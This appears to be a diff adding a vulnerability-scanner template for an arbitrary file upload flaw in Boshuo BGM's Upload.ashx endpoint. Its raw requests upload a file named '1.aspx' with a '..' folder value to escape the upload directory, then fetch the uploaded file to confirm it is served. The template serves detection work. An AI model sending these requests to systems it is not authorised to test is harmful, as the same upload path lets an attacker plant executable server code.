@@ -1,0 +1,69 @@
+id: boshuoBGM-Upload-upload
+
+info:
+  name: 博硕BGM Upload.ashx 存在任意文件上传漏洞
+  author: boshuoBGM
+  severity: high
+  tags: boshuoBGM
+
+http:
+  - raw:
+      - |
+        POST /WebUpload/server/Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfy1X
+
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="id"
+        
+        WU_FILE_0
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="name"
+        
+        1.aspx
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="size"
+        
+        10000
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="type"
+        
+        image/jpeg
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="OwnBaseFolder"
+        
+        ..
+        ------WebKitFormBoundary1zY65etyNeQDfy1X
+        Content-Disposition: form-data; name="file"; filename="1.jpg"
+        Content-Type: image/jpeg
+        
+        {{randstr}}
+        ------WebKitFormBoundary1zY65etyNeQDfy1X--
+
+      - |+
+        GET /WebUpload/{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - 'WebUpload/(.*?\.aspx)"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
+
